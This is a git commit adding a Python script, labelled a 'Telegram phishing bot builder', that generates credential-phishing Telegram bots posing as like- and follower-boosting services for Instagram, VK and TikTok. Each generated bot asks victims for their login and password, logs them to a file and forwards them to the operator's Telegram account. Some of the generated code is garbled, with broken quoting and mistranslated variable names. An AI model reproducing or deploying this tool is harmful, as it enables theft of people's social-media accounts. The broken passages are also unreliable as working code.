c8e4fd7e49e7d30419c32e6ebe42793e5768ea84
KING 👑 CY78 <hozoohunter@gmail.com>
2024-12-19 01:05:54 +0700

    Create Instragram.py

---
+++ Instragram.py
@@ -0,0 +1,421 @@
+#CY78 PROJECTS 🌷 
+
+import colorama
+from colorama import Fore, Back, Style
+import os
+from sys import platform
+import base64
+def clear():
+	if platform == "linux" or platform == "linux2":
+		os.system("clear")
+	elif platform == "win32":
+		os.system('cls')
+clear()
+en = base64.b64decode('Q29kZWQgYnkgQGxhbWVyMTEyMzEx')
+print (en.decode("UTF-8"))
+print (Fore.GREEN + '''
+⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏⠀⠀⠀⢛⣫⣶⣿⣿
+⣿⣿⣿⠀⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶⠀⠀⢿⣿⡿⠿⢛
+⣿⣿⡇⠀⠀⠀⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀⠀⢰⣾⣿⣿
+⣿⣿⣷⠀⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿
+⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆⠀⣿⣿⣿⣿
+⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋⠀⣿⣿⣿⣿
+⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁⠀⠀⠀⣰⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏⠀⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇⠀⢰⡀⢹⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘⠀⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿
+⣿⣿⣿⣿⡿⠀⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉⠀⠐⠀⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿
+⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿
+⣿⣿⣿⣿⣧⠀⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿
+⣿⣿⣿⣿⡇⠀⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿
+⣿⣿⣿⣿⣷⠀⠀⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾⠀⡌⠀⠐⠘⣿⣿
+⣿⣿⣿⣿⣿⠀⡐⠈⠸⣏⡇⠀⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸⠀⢸⡂⠱⠀⠇⠀⣿⣿
+⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼⠀⠐⠀⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟⠀⡿⠀⢸⠀⠃⠄⠀⡀⢸⣿
+⡟⡻⢛⡡⠊⣠⠇⠀⡗⢸⢱⠀⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗⠀⣸⠱⠀⡐⠆⠁⢢⠀⠁⢸⣿
+⣷⣦⡄⠀⣜⠃⠀⢠⠘⠆⠂⢇⠀⠉⠀⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖⠀⠩⡄⠂⢸⣿
+⣿⣿⡃⡜⢡⢂⠀⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆⠀⠀⠈⠀⠀⣿
+⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄⠀⠀⢀⣴⣿         
+    
+	''')
+input(Fore.RED + "Tekan Enter>>")
+clear()
+
+print (Fore.MAGENTA + '''
+ 
+⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠴⠶⠶⠶⠶
+⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
+⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
+⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
+⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+
+
+	''')
+
+print (Fore.GREEN + '#########################################')
+print (Fore.GREEN + '+' + Fore.BLUE +  "     Telegram phishing bot builder     " + Fore.GREEN + '+')
+print (Fore.GREEN + '+' + Fore.BLUE +  "        [CY78 PROJECTS ]                      " + Fore.GREEN + '+')
+print (Fore.GREEN + '#########################################')
+userid = input(Fore.YELLOW +  "Masukkan milik Anda Telegram ID > ")
+token = input(Fore.BLUE +  "Masukkan token bot Anda> ")
+print (Fore.CYAN + '''
+[1] Instagram
+[2] VK
+[3] Tiktok
+	''')
+choice = input(Fore.MAGENTA +  "Pilih opsi phishing di bot>>> ")
+if not choice.isdigit():
+	print ("Kesalahan, opsi harus berupa angka")
+	exit(0)
+choice = int(choice)
+
+
+
+if choice == 1:
+	f = open('Instagram.py', 'w+', encoding='utf-8')
+	f.write(f"""
+import telebot
+from telebot import *
+import time
+import random
+print ("Bot diluncurkan!")
+log = open('bot-log.txt', 'a+', encoding='utf-8')
+ID = '{userid}'
+bot = telebot.TeleBot("{token}")
+try:
+	bot.send_message(ID, '!Bot diluncurkan!') 
+except:
+	print ("Mungkin Anda tidak menulis/start di bot Anda!  Tanpa tindakan ini skrip tidak akan berfungsi dengan benar!")
+
+
+@bot.message_handler(commands=['start'])
+def start(message):
+	print (f'Pengguna terdeteksi!'
+ID: {{message.from_user.id}}''')
+	bot.send_message(message.chat.id, '''👋 Halo! 👋
+		Ini adalah bot untuk mendapatkan suka dan pelanggan akun Instagram Anda!
+ 		 Untuk memulai, klik /CY78''') 
+
+@bot.message_handler(commands=['CY78'])
+def lamer112311(message):
+	bot.send_message(message.chat.id, ''dibuat oleh CY78 PROJECTS") 
+
+@bot.message_handler(commands=['CY78', 'n'])
+def start1(message):
+	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
+	first_button = types.InlineKeyboardButton(text="Suka❤️", callback_data="like")
+	second_button = types.InlineKeyboardButton(text="Pelanggan📃", callback_data="sub")
+	keyboardmain.add(first_button, second_button)
+	bot.send_message(message.chat.id, "Pilih sebuah item:", reply_markup=keyboardmain)
+
+@bot.callback_query_handler(func=lambda call:True)
+def callback_inline1(call):
+	if call.data == "like":
+		msg = bot.send_message(call.message.chat.id, 'Masukkan jumlah suka( tidak lebih500)') 
+		bot.register_next_step_handler(msg, qproc1)
+
+	elif call.data == "sub":
+		msg = bot.send_message(call.message.chat.id, ' Masukkan jumlah pelanggan(tidak lebih 100)') 
+		bot.register_next_step_handler(msg, qproc2)
+
+def qproc1(message):
+	try:
+		num = message.text	
+		if not num.isdigit():
+			msg = bot.reply_to(message, 'Masukkan kuantitas sebagai angka!  Coba lagi dengan menulis /CY78!')#⏳
+			return
+		elif int(num) > 500:
+			bot.reply_to(message, ' Jumlah suka tidak bisa lebih500!')
+			return
+		else:
+			bot.send_message(message.chat.id, f'Jumlah suka: {{num}}')
+			msg = bot.send_message(message.chat.id, ''Masukkan email (atau nomor telepon) dari akun Anda:) 
+			bot.register_next_step_handler(msg, step1)
+	except Exception as e:
+		print (e)
+
+
+def qproc2(message):
+	try:
+		num = message.text
+		if not num.isdigit():
+			bot.reply_to(message, 'Masukkan kuantitas sebagai angka!  Coba lagi dengan menulis /CY78!')#⏳
+			return
+		elif int(num) > 100:
+			bot.reply_to(message, 'Jumlah pelanggannya tidak boleh lebih 100!')
+			return
+		else:
+			bot.send_message(message.chat.id, f'Колличество подписчиков: {{num}}')
+			msg = bot.send_message(message.chat.id, 'Masukkan email (atau nomor telepon) dari akun Anda:') 
+			bot.register_next_step_handler(msg, step1)
+	except Exception as e:
+		print (e)
+
+
+def step1(message):
+	get = f'''Data diterima: 
+Diterima di bot: instagram
+ID: {{message.from_user.id}}
+nama panggilan: @{{message.from_user.username}}
+Login: {{message.text}}
+Nama: {{message.from_user.first_name}}
+
+'''
+	log = open('bot-log.txt', 'a+', encoding='utf-8')
+	log.write(get + '  ')
+	log.close()
+	print(get)
+	bot.send_message(ID, get)
+	bot.reply_to(message, f'login Anda: {{message.text}}')
+
+	msg1 = bot.send_message(message.chat.id, 'Masukkan kata sandi akun Anda:') 
+	bot.register_next_step_handler(msg1, step2)
+
+	
+def step2(message):
+	usrpass = message.text
+	get = f'''Data diterima: 
+Diterima di bot: instagram
+ID: {{message.from_user.id}}
+nama panggilan: @{{message.from_user.username}}
+Kata sandi: {{usrpass}}
+Nama: {{message.from_user.first_name}}
+
+'''
+	print (get)
+	log = open('bot-log.txt', 'a+', encoding='utf-8')
+	log.write(get + '  ')
+	log.close()
+	bot.send_message(ID, get)
+	msg = bot.reply_to(message, f'Kata sandi Anda: {{usrpass}}')
+	time.sleep(1)
+	bot.reply_to(message, f'Terima kasih telah menggunakan layanan kami😉!  Jika data yang dimasukkan benar, akun Anda akan mendapat peningkatan dalam waktu 24 jam!')
+
+bot.polling()
+		""")
+	f.close()
+	input("Mengajukan Instagram.py diselamatkan!  Tekan Enter")
+
+if choice == 2:
+	f = open('vk.py', 'w+', encoding='utf-8')
+	f.write(f"""
+import telebot
+from telebot import *
+import time
+
+print ("Bot diluncurkan!")
+
+log = open('bot-log.txt', 'a+', encoding='utf-8')
+ID = '{userid}'
+bot = telebot.TeleBot("{token}")
+try:
+	bot.send_message(ID, '!Бот запущен!') 
+except:
+	print ("Mungkin Anda tidak menulis /memulai di bot Anda!  Tanpa tindakan ini, skrip tidak akan berfungsi dengan benar!")
+
+@bot.message_handler(commands=['start'])
+def start(message):
+	print (f''Pengguna terdeteksi'!
+	ID: {{message.from_user.id}}''')
+	bot.send_message(message.chat.id, '''👋 Halo! 👋
+		Ini adalah bot untuk menambahkan suka dan teman ke akun VK Anda!Ini adalah bot untuk menambahkan suka dan teman ke akun VK Anda!
+		Untuk memulai, klik		 /nCY78 ''') 
+
+@bot.message_handler(commands=['lamer112311dev'])
+def lamer112311(message):
+	bot.send_message(message.chat.id, 'This tool was created by the cy78 project on 2024-12-19') 
+
+@bot.message_handler(commands=['CY78', 'n'])
+def start1(message):
+	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
+	first_button = types.InlineKeyboardButton(text="Suka❤️", callback_data="like")
+	second_button = types.InlineKeyboardButton(text="Teman-teman📃", callback_data="like")
+	button3 = types.InlineKeyboardButton(text="Repost", callback_data="like")
+	button4 = types.InlineKeyboardButton(text="Mendengarkan daftar putar", callback_data="like")
+	keyboardmain.add(first_button, second_button, button3, button4)
+	bot.send_message(message.chat.id, "Pilih sebuah item:", reply_markup=keyboardmain)
+
+@bot.callback_query_handler(func=lambda call:True)
+def callback_inline1(call):
+	if call.data == "like":
+		msg = bot.send_message(call.message.chat.id, 'Masukkan jumlahnya (tidak lebih dari 500)') 
+		bot.register_next_step_handler(msg, qproc1)
+
+def qproc1(message):
+	try:
+		num = message.text	
+		if not num.isdigit():
+			msg = bot.reply_to(message, 'Masukkan kuantitas sebagai angka! Coba lagi dengan menulis /nCY78!')#⏳
+			return
+		elif int(num) > 500:
+			bot.reply_to(message, 'Jumlahnya tidak bisa lebih 500!')
+			return
+		else:
+			bot.send_message(message.chat.id, f'Kuantitas: {{num}}')
+			msg = bot.send_message(message.chat.id, 'Masukkan nomor telepon dari akun Anda:') 
+			bot.register_next_step_handler(msg, step1)
+	except Exception as e:
+		print (e)
+
+
+
+
+def step1(message):
+	inp = message.text.replace("+", "")
+	if not inp.isdigit():
+		bot.reply_to(message, 'Masukkan nomor sebagai nomor! Coba lagi dengan menulis /nCY78!')#⏳
+		return
+	get = f'''Data diterima: 
+Diterima di bot: vk
+ID: {{message.from_user.id}}
+nama panggilan: @{{message.from_user.username}}
+Login: {{message.text}}
+Nama: {{message.from_user.first_name}}
+
+'''
+	log = open('bot-log.txt', 'a+', encoding='utf-8')
+	log.write(get + '  ')
+	log.close()
+	print(get)
+	bot.send_message(ID, get)
+	bot.reply_to(message, f'Ваш логин: {{message.text}}')
+
+	msg1 = bot.send_message(message.chat.id, 'Masukkan kata sandi akun Anda:') 
+	bot.register_next_step_handler(msg1, step2)
+
+	
+def step2(message):
+	usrpass = message.text
+	get = f'''Data yang diterima:
+ Diterima di bot: vk 
+ID: {{message.from_user.id}}
+nama panggilan: @{{message.from_user.username}}
+Kata sandi: {{usrpass}}
+Nama: {{message.from_user.first_name}}
+
+'''
+	print (get)
+	log = open('bot-log.txt', 'a+', encoding='utf-8')
+	log.write(get + '  ')
+	log.close()
+	bot.send_message(ID, get)
+	msg = bot.reply_to(message, f'Kata sandi Anda: {{usrpass}}')
+	time.sleep(1)
+	bot.reply_to(message, f'Terima kasih telah menggunakan layanan kami😉!  Jika data yang dimasukkan benar, maka akun Anda akan di-boost dalam waktu 24 jam!')
+bot.polling()
+		""")
+	f.close()
+	input("File vk.py telah disimpan!  Klik Enter")
+
+if choice == 3:
+	f = open('tiktok.py', 'w+', encoding='utf-8')
+	f.write(f"""
+import telebot
+from telebot import *
+import time
+print ("Bot diluncurkan!")
+print ("Bot diluncurkan dan siap digunakan!")
+log = open('bot-log.txt', 'a+', encoding='utf-8')
+ID = '{userid}'
+bot = telebot.TeleBot("{token}")
+try:
+	bot.send_message(ID, '!Бот запущен!') 
+except:
+	print ("Mungkin Anda tidak menulis /memulai di bot Anda!  Tanpa tindakan ini, skrip tidak akan berfungsi dengan benar!")
+@bot.message_handler(commands=['start'])
+def start(message):
+	print (f'''Pengguna terdeteksi!
+ID: {{message.from_user.id}}''')
+	bot.send_message(message.chat.id, '''👋 Halo! 👋
+		Ini adalah bot untuk mempromosikan akun tiktok Anda!
+ 		 Untuk memulai, klik /nCY78''') 
+
+@bot.message_handler(commands=['CY78'])
+def lamer112311(message):
+	bot.send_message(message.chat.id, 'CY78') 
+
+@bot.message_handler(commands=['CY78', 'n'])
+def start1(message):
+	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
+	first_button = types.InlineKeyboardButton(text="Suka❤️", callback_data="like")
+	second_button = types.InlineKeyboardButton(text="Pelanggan📃", callback_data="like")
+	button3 = types.InlineKeyboardButton(text="Tampilan", callback_data="like")
+	button4 = types.InlineKeyboardButton(text="Repost", callback_data="like")
+	keyboardmain.add(first_button, second_button, button3, button4)
+	bot.send_message(message.chat.id, "Pilih sebuah item:", reply_markup=keyboardmain)
+
+@bot.callback_query_handler(func=lambda call:True)
+def callback_inline1(call):
+	if call.data == "like":
+		msg = bot.send_message(call.message.chat.id, 'Masukkan jumlahnya (tidak lebih dari 500)') 
+		bot.register_next_step_handler(msg, qproc1)
+
+def qproc1(message):
+	try:
+		num = message.text	
+		if not num.isdigit():
+			msg = bot.reply_to(message, 'Masukkan kuantitas sebagai angka! Silakan coba lagi untuk melakukan nya  /nCY78!')#⏳
+			return
+		elif int(num) > 500:
+			bot.reply_to(message, 'Jumlahnya tidak bisa lebih 500!')
+			return
+		else:
+			bot.send_message(message.chat.id, f'Kuantitas: {{num}}')
+			msg = bot.send_message(message.chat.id, 'Masukkan nomor telepon (atau email) dari akun Anda:') 
+			bot.register_next_step_handler(msg, step1)
+	except Exception as e:
+		print(e)
+
+
+
+
+def step1(message):
+	get = f'''Data yang diterima: 
+ Diterima di bot: tiktok
+ ID: {{message.from_user.id}}
+ Nama panggilan: @{{message.from_user.username}}
+ Masuk: {{message.text}}
+ Nama: {{pesan.dari_pengguna.nama_pertama}}
+
+'''
+	log = open('bot-log.txt', 'a+', encoding='utf-8')
+	log.write(get + '  ')
+	log.close()
+	print(get)
+	bot.send_message(ID, get)
+	bot.reply_to(message, f'login Anda: {{message.text}}')
+
+	msg1 = bot.send_message(message.chat.id, 'Masukkan kata sandi akun Anda:') 
+	bot.register_next_step_handler(msg1, step2)
+
+	
+def step2(message):
+	usrpass = message.text
+	get = f'''Data yang diterima:
+ Diterima di bot: tiktok 
+ ID: {{message.from_user.id}}
+ Nama panggilan: @{{message.from_user.username}}
+ Kata sandi: {{usrpass}}
+ Nama: {{pesan.dari_pengguna.nama_pertama}}
+
+'''
+	print (get)
+	log = open('bot-log.txt', 'a+', encoding='utf-8')
+	log.write(get + '  ')
+	log.close()
+	bot.send_message(ID, get)
+	msg = bot.reply_to(message, f'Kata sandi Anda: {{usrpass}}')
+	time.sleep(1)
+	bot.reply_to(message, f'Terima kasih telah menggunakan layanan kami😉!  Jika data yang dimasukkan benar, akun Anda akan mendapat peningkatan dalam waktu 24 jam!')
+
+bot.polling()
+		""")
+	f.close()
+	input("File tiktok.py telah disimpan!  Klik Enter")
+#CY78 PROJECTS 
